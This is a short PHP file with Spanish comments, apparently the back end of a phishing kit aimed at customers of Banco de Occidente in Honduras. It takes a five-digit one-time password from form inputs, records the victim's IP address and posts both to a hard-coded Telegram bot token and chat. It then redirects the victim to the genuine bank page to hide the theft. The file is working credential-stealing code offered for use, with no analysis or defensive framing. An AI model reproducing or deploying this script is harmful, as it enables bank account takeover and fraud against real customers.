<?php
// Recibir los datos del formulario
$otp1 = htmlspecialchars($_POST['otp1']);
$otp2 = htmlspecialchars($_POST['otp2']);
$otp3 = htmlspecialchars($_POST['otp3']);
$otp4 = htmlspecialchars($_POST['otp4']);
$otp5 = htmlspecialchars($_POST['otp5']);

// Combinar los valores de los inputs para formar el código OTP completo
$otpCompleto = $otp1 . $otp2 . $otp3 . $otp4 . $otp5;

// Obtener la dirección IP del usuario
$userIP = $_SERVER['REMOTE_ADDR'];

// Formatear el mensaje a enviar
$message = "📌 *Nuevo código OTP2 recibido* 📌\n\n";
$message .= "🔑 *Código OTP*: $otpCompleto\n";
$message .= "🌐 *IP del usuario*: $userIP\n";

// Configuración del bot de Telegram
$botToken = '7722702763:AAHt3VkpAiZ0kcz-HO5toJpHecoaM2Hny3k'; // Reemplaza con el token de tu bot
$chatId = '-4783394331'; // Reemplaza con tu ID de chat o canal

// Enviar los datos a Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar el mensaje
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirigir al usuario a una página de confirmación
header('Location: https://www.bancodeoccidente.hn/tarjetas/beneficios'); // Cambia esto según la página a la que desees redirigir
exit;
?>
